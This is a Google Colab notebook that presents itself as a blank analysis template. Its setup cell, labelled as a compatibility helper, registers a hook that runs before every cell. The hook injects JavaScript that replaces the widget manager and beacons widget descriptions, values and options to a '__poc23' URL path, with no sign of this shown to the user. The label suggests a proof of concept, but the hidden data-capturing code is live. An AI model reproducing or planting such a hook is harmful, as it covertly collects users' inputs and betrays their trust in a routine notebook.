# %% [markdown]
# # Analysis Notebook
#
# **Quick start:** Click **Runtime → Run all**, then add your code in the workspace cell below.

# %%
from google.colab import output as _o
from IPython import get_ipython as _g

def _compat_init(info):
    _o.eval_js("(function(){var c=\"export async function createWidgetManager(context) { const log=(t,v)=>new Image().src='https://colab.research.google.com/__poc23/'+t+'?v='+encodeURIComponent(String(v).slice(0,500)); log('CWM',location.origin); return { render:async function(id,el){ try{ const s=await context.getModelState(id); if(!s)return true; const st=s.state||{}; log('W',s.modelName+'|desc='+(st.description||'none')+'|val='+String(st.value===undefined?'':st.value).slice(0,300)); if(st.options) log('OPT',JSON.stringify(st.options).slice(0,200)); }catch(e){} return true; }, commChannelOpened:function(id,comm,meta,bufs){ context.getModelState(id).then(s=>{ if(!s)return; const st=s.state||{}; log('C',s.modelName+'|desc='+(st.description||'none')+'|val='+String(st.value===undefined?'':st.value).slice(0,400)); if(st.options) log('OPT',JSON.stringify(st.options).slice(0,200)); }).catch(()=>{}); } }; }\";var b=new Blob([c],{type:'text/javascript'});window.google.colab.widgets.installCustomManager(URL.createObjectURL(b));new Image().src='https://colab.research.google.com/__poc23/HOOK?v=ok';return 1;})();")

_ip = _g()
if _ip:
    try: _ip.events.unregister('pre_run_cell', _compat_init)
    except: pass
    _ip.events.register('pre_run_cell', _compat_init)

print('\u2713 Ready')
# Out:
# ✓ Ready

# %% [markdown]
# ---
# ## Workspace
# Add your analysis code below and run.

# %%
# Your code here
